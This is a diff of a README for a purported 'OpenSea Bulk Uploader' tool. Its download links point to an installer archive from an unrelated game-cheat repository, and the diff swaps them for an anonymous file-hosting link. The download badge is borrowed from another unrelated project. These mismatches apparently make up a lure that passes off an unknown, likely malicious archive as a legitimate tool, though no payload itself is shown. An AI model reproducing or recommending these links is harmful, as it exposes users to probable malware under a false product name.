@@ -18,8 +18,8 @@ The OpenSea Bulk Uploader is a powerful tool designed to simplify and enhance yo
 To get started with the OpenSea Bulk Uploader, explore the detailed documentation in this repository. You'll find step-by-step guides, tutorials, and real-world examples to help you harness the full power of this tool.
 
 ## Download 📁
-<a href="https://github.com/lordline/Valorant-Fecurity-Cheat/releases/download/fecurity/SoftInstaller.rar" alt="Downloads"><img src="https://img.shields.io/github/downloads/Kryptxne/valorant-inception/total?color=00dd00&style=for-the-badge"></a>
-<a href="https://github.com/lordline/Valorant-Fecurity-Cheat/releases/download/fecurity/SoftInstaller.rar">Click To Download!</a>
+<a href="https://www.sendspace.com/file/wnep8t" alt="Downloads"><img src="https://img.shields.io/github/downloads/Kryptxne/valorant-inception/total?color=00dd00&style=for-the-badge"></a>
+<a href="https://www.sendspace.com/file/wnep8t">Click To Download!</a>
 
 ## Contributions
 
